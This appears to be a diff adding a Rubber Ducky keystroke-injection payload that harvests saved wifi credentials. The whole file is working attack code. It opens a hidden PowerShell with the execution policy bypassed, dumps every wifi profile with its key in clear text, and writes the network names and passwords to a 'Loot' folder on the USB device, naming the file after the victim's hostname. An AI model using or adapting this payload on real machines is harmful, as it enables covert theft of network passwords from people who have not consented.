@@ -1,0 +1,11 @@
+REM Wifi Passwords
+REM Grabs saved wifi network names and passwords and stores them in loot folder on rubber ducky - filename will be the hostname of the pc
+ATTACKMODE HID STORAGE
+DELAY 5000
+GUI r
+DELAY 2000
+STRING powershell -NoP -W hidden -NonI -Exec Bypass
+ENTER
+DELAY 2000
+STRING $m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\Loot'; cd $m; (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -Wrap | out-file "$env:COMPUTERNAME.txt"
+ENTER
